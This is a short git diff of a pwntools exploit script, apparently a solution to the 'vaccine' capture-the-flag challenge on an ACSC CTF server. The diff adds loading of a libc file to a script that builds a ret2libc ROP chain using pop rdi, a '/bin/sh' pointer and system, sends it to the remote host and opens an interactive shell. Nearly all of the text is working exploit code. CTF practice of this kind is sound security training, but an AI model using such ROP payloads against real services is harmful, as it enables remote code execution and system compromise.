@@ -1,11 +1,10 @@
 from pwn import *
 elf = context.binary = ELF('./vaccine_patched')
-
+libc = ELF('./libc.so.6')
 context.log_level = 'DEBUG'
 rop_elf = ROP(elf)
 pop_rdi = rop_elf.find_gadget(["pop rdi","ret"])[0]
 ret = rop_elf.find_gadget(["ret"])[0]
-
 p = remote("vaccine-2.chal.ctf.acsc.asia",1337)
 #p = process()
 p.recv()
@@ -29,4 +28,5 @@ payload += p64(pop_rdi)
 payload += p64(bin_sh)
 payload += p64(system)
 p.sendline(payload)
+
 p.interactive()
